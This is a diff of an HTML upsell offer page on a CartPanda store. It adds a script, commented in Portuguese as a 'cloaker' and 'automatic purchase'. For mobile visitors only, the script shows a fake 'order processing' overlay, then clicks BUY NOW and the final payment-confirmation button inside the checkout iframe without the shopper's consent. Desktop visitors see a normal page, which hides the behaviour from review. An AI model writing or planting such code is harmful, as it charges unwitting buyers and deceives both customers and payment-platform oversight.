@@ -1,13 +1,16 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script src="https://assets.mycartpanda.com/cartx-ecomm-ui-assets/js/libs/ocu-external.js"></script>
-  <script>
-    new OcuExternal();
-  </script>
+                <script
+                src="https://assets.mycartpanda.com/cartx-ecomm-ui-assets/js/libs/ocu-external.js">
+                </script>
+
+                <script>
+                new OcuExternal();
+                </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Special Offer</title>
+  <title>TESTE-070725-1330</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -36,12 +39,7 @@
       border-radius: 8px;
       font-size: 1.2em;
       cursor: pointer;
-      margin: 10px 0;
-      text-decoration: none;
-      display: inline-block;
-    }
-    .no-thanks {
-      background-color: red;
+      margin: 30px 0;
     }
     .section {
       padding: 20px;
@@ -134,10 +132,7 @@
     <a href="https://vm-business.mycartpanda.com/ex-ocu/next-offer/q7YEdPEVMp?accepted=yes" class="cta-button">
       BUY NOW
     </a>
-  </div>
-
-  <div class="center button-spacing">
-    <a href="https://vm-business.mycartpanda.com/ex-ocu/next-offer/q7YEdPEVMp?accepted=no" class="cta-button no-thanks">
+    <a href="https://vm-business.mycartpanda.com/ex-ocu/next-offer/q7YEdPEVMp?accepted=no" class="cta-button">
       NO, THANKS
     </a>
   </div>
@@ -146,5 +141,125 @@
     <p>See you on the other side,<br>
     Dr. David Cain</p>
   </div>
+
+	<script>
+	  // Aguarda o conteúdo da página ser completamente carregado para iniciar o processo.
+	  document.addEventListener('DOMContentLoaded', () => {
+
+	  // PARTE 1: CLOAKER
+	  const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+	  if (!isMobile) {
+		console.log('Usuário de Desktop detectado. A página de upsell será exibida normalmente.');
+		return; 
+	  }
+	  console.log('Usuário de Celular/Tablet detectado. Ativando compra automática com tela de carregamento.');
+	  
+	  // PARTE 2: TELA DE CARREGAMENTO
+	  function showLoadingScreen() {
+		const loadingCSS = `
+		  <style id="loading-style">
+			.loader-container {
+			  position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+			  background-color: #e3e8ee; z-index: 999999; font-family: Arial, sans-serif;
+			}
+			.loader-content-wrapper {
+			  position: absolute; top: 50%; left: 50%;
+			  transform: translate(-50%, -50%);
+			  display: flex; flex-direction: column; align-items: center;
+			}
+			.loader-spinner {
+			  border: 8px solid #cccccc; border-top: 8px solid #2180c0;
+			  border-radius: 50%; width: 45px; height: 45px;
+			  animation: spin 1s linear infinite; margin-bottom: 25px;
+			}
+			@keyframes spin {
+			  0% { transform: rotate(0deg); }
+			  100% { transform: rotate(360deg); }
+			}
+			.loader-text {
+			  color: #525559; font-size: 18px; text-align: center;
+			}
+			.loader-text .title {
+			  font-weight: bold; margin-bottom: 8px;
+			}
+		  </style>
+		`;
+		const loadingHTML = `
+		  <div id="custom-loader" class="loader-container">
+			<div class="loader-content-wrapper">
+			  <div class="loader-spinner"></div>
+			  <div class="loader-text">
+				<p class="title">Your order is being processed.</p>
+				<p>Do not close this page.</p>
+			  </div>
+			</div>
+		  </div>
+		`;
+		document.head.insertAdjacentHTML('beforeend', loadingCSS);
+		document.body.insertAdjacentHTML('beforeend', loadingHTML);
+	  }
+	  showLoadingScreen();
+
+	  // PARTE 3: COMPRA AUTOMÁTICA
+	  const tempoDeEsperaEmSegundos = 3;
+	  const seletorBotaoComprar = 'a.cta-button[href*="accepted=yes"]';
+	  const seletorIframePopUp = 'iframe.cp-exocu-frame';
+	  const idBotaoConfirmacaoFinal = 'cartpanda-payment-confirmation';
+
+	  console.log('Script de compra automática iniciado em background. Aguardando ' + tempoDeEsperaEmSegundos + ' segundos...');
+
+	  setTimeout(() => {
+		console.log('Tempo de espera finalizado. Procurando o botão "BUY NOW"...');
+		const botaoComprar = document.querySelector(seletorBotaoComprar);
+		if (botaoComprar) {
+		  console.log('Botão "BUY NOW" encontrado. Clicando para iniciar o pop-up de confirmação...');
+		  botaoComprar.click();
+		  monitorarPopupDeConfirmacao();
+		} else {
+		  console.error('ERRO: O botão "BUY NOW" com o seletor "' + seletorBotaoComprar + '" não foi encontrado na página.');
+		}
+	  }, tempoDeEsperaEmSegundos * 1000);
+
+	  function monitorarPopupDeConfirmacao() {
+		let tentativas = 0;
+		const maxTentativas = 60;
+		console.log('Iniciando monitoramento do pop-up de confirmação...');
+		const intervalo = setInterval(() => {
+		  tentativas++;
+		  if (tentativas > maxTentativas) {
+			clearInterval(intervalo);
+			console.error('ERRO: O pop-up de confirmação não apareceu após ' + (maxTentativas * 250 / 1000) + ' segundos.');
+			return;
+		  }
+		  const iframe = document.querySelector(seletorIframePopUp);
+		  if (iframe) {
+			console.log('Iframe do pop-up encontrado. Procurando pelo botão de confirmação final...');
+			try {
+			  const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
+			  const botaoConfirmacao = iframeDocument.getElementById(idBotaoConfirmacaoFinal);
+			  if (botaoConfirmacao) {
+				console.log('Botão de confirmação final (' + idBotaoConfirmacaoFinal + ') encontrado. Aguardando 8000ms antes do clique para garantir a inicialização completa do script.');
+				
+				// ============== A CORREÇÃO ESTÁ AQUI ==============
+				// Adicionamos um pequeno delay para garantir que o script da CartPanda
+				// tenha tempo de anexar todos os seus eventos ao formulário.
+				setTimeout(() => {
+					console.log('Realizando o clique final!');
+					botaoConfirmacao.click();
+					console.log('Ação de clique para finalizar a compra foi executada com sucesso!');
+				}, 8000); // Atraso de 8000 milissegundos
+
+				clearInterval(intervalo); // Limpa o monitoramento pois o botão já foi encontrado.
+			  }
+			} catch (e) {
+			  clearInterval(intervalo);
+			  console.error('ERRO de segurança ao tentar acessar o conteúdo do iframe.', e);
+			}
+		  }
+		}, 250);
+	  }
+	  });
+	</script>
+
 </body>
 </html>
